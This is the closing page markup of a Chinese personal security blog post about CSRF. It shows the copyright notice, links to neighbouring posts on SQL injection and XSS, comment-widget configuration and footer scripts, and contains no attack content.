</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Yunen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.0x002.com/2019/关于CSRF的那点事儿/">https://www.0x002.com/2019/关于CSRF的那点事儿/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.0x002.com">Yunen's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/SQL注入使用Django中继数据包bypassWAF/"><i class="fa fa-chevron-left">  </i><span>SQL注入使用Django中继数据包bypassWAF</span></a></div><div class="next-post pull-right"><a href="/2019/关于我学XSS躺过的那些坑/"><span>关于我学XSS躺过的那些坑</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'Xl1tFeGDPcFzY1gIYVQo75rr-gzGzoHsz',
  appKey:'6YTKXORDpitI5WYSHaNjY1Ho',
  placeholder:'来都来了，不留下点什么吗？',
  avatar:'hide',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://0d077ef9e74d8.cdn.sohucs.com/rnCyUFE_jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By Yunen</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">攻防无绝对，技术无黑白。<script>(function(){var bp = document.createElement('script');var curProtocol = window.location.protocol.split(':')[0];if (curProtocol === 'https') {bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';}else {bp.src = 'http://push.zhanzhang.baidu.com/push.js';}var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(bp, s);})();</script></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>